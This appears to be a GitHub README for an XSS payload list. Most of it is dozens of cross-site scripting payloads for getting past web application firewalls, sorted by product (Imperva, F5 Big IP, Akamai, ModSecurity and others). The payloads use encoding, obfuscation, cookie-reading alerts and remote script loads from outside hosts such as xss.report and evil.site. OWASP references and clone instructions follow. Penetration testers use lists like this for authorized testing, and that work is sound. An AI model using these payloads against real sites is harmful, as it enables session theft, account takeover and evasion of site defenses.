### 🚀 Cross Site Scripting ( XSS ) Vulnerability Payload List 🚀

#### XSS Waf Bypass Payload List :

```html
'"><script>alert('karem')</script> 
'"><img src=1 onerror="alert('Karem')">
'"><img src=1 onkarem=1 onerror="alert('Karem')"> 
<script/src=//6a%2elv></script> 
'"></script><script>alert(document.cookie)</script> 
%27"accesskey="x" onclick="alert(document.cookie)" x=" 
"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS 
<details/open=/open/href=/data=;+ontoggle="(alert)(document.cookie)> 
"><iframe/src=javascript:alert%26%23x000000028%3b)> 
%22%3E%3Ciframe/src%3Djavascript%3Aalert%2526%2523x000000028%253b%29%3E%0A 
<svg onload=prompt%26%230000000040document.domain)> 
<h1 onmouseover="alert('karem')" style="color: red;">karem</h1> 
"><button%20popovertarget=x>Click%20me</button>%20<input%20type="hidden"%20value="y"%20popover%20id=x%20onbeforetoggle=alert(document.cookie)> 
"><a href="javascript:alert('xss')">clickme</a>
<svg onload=prompt%26%230000000040document.domain)> 
 '"><script>alert('karem')</script>@gmail.com 
%0Dalert`1`// 
"<script>alert</script>"@gmail.com 
"><img src=1 OnErRoR=alert('xss')> 
'"><script src=https://xss.report/c/karemelsqary74></script> 
"><svg/onload=alert.bind()(document.domain)> 
'`><\x00img src=xxx:x onerror=javascript:alert(1)> 
'"><<Svg/Only=1/OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
"><button%20popovertarget=x>Click%20me</button>%20<input%20type="hidden"%20value="y"%20popover%20id=x%20onbeforetoggle=alert(document.cookie)>
<style>*{background-image:url('\\\\6A\\\\61\\\\76\\\\61\\\\73\\\\63\\\\72\\\\69\\\\70\\\\74\\\\3A\\\\61\\\\6C\\\\65\\\\72\\\\74\\\\28\\\\6C\\\\6F\\\\63\\\\61\\\\74\\\\69\\\\6F\\\\6E\\\\29')}</style>
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E
[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
"><input/onauxclick="[1].map(prompt)">
<img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
'"--><Body onbeforescriptexecute="[1].map(confirm)">
'-prompt.call(window, 'xss')-'
<svg+onload=innerHTML=URL,outerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
<img src=x onVector=X-Vector onerror=alert(1)>
%2sscript%2ualert()%2s/script%2u
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
toString=\\\\u0061lert;window+' '
aaaaa<h1 onclick=alert(1)>test
<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">

# Quick Defense:
<input type="search" onsearch="aler\\\\u0074(1)">
<details ontoggle="aler\\\\u0074(1)">

# Unicode + HTML
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>

# URL
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>

# Hex
<script>eval('\\\\x61lert(1)')</script>

# Only lowercase block
<sCRipT>alert(1)</sCRipT>

# Break regex
<script>%0aalert(1)</script>

# Recursive filters
<scr<script>ipt>alert(1)</scr</script>ipt>

# Inject anchor tag
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">

# Bypass whitespaces
<svg·onload=alert(1)>

# Change GET to POST request

# Imperva Incapsula
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
<img/src="x"/onerror="[JS-F**K Payload]">
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\\\\ert\\\\`1\\\\``'>

# WebKnight
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

# F5 Big IP
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">

# PHP-IDS
<svg+onload=+"[DATA]"
<svg+onload=+"aler%25%37%34(1)"

# Mod-Security
<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>

# Sucuri WAF
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4

# Akamai
1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
<SCr%00Ipt>confirm(1)</scR%00ipt>

# AngularJS
{{constructor.constructor(alert 1 )()}}

#html Sanitization Bypass
<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/

# Bypass ‘ ‘ ( ) 
<iframe/src=javascript:alert%26%23x000000028%3b%27hacked%27)>
# waf Bypass SVG
<svg><a xlink:href=?usemap=/*&#x26;#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;*/onmouseover=window.focus()//>Hover me</a></svg>
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
<textarea/onbeforeinput=kuro=&[#x27](tg://search_hashtag?hashtag=x27);//domain.tld&[#x27](tg://search_hashtag?hashtag=x27);;import(kuro)%09autofocus%09x>
<div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
Payload before obfuscation: <div onpointerover="javascript:alert([document.domain](http://document.domain/?trk=public_post-text))" style="width:100%;height:100vh;"></div>

```

#### References :

###### Cross-site Scripting (XSS)

* 👉 https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

###### XSS (Cross Site Scripting) Prevention Cheat Sheet

* 👉 https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet

###### DOM based XSS Prevention Cheat Sheet

* 👉 https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet

###### Testing for Reflected Cross site scripting (OTG-INPVAL-001)

* 👉 https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)

###### Testing for Stored Cross site scripting (OTG-INPVAL-002)

* 👉 https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)

###### Testing for DOM-based Cross site scripting (OTG-CLIENT-001)

* 👉 https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)

###### DOM Based XSS

* 👉 https://www.owasp.org/index.php/DOM_Based_XSS

###### Cross-Site Scripting (XSS) Cheat Sheet | Veracode

* 👉 https://www.veracode.com/security/xss

#### Recommended books :

* [XSS Attacks: Cross-site Scripting Exploits and Defense](https://books.google.com.tr/books/about/XSS_Attacks.html?id=dPhqDe0WHZ8C)

* [XSS Cheat Sheet](https://leanpub.com/xss)


### Cloning an Existing Repository ( Clone with HTTPS )
```
root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/xss-payload-list.git
```

### Cloning an Existing Repository ( Clone with SSH )
```
root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/xss-payload-list.git
```

### Published Website :

##### Kitploit - https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html

### Donate!

Support the authors:

#### LiberaPay:

<noscript><a href="https://liberapay.com/ismailtasdelen/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
--end--
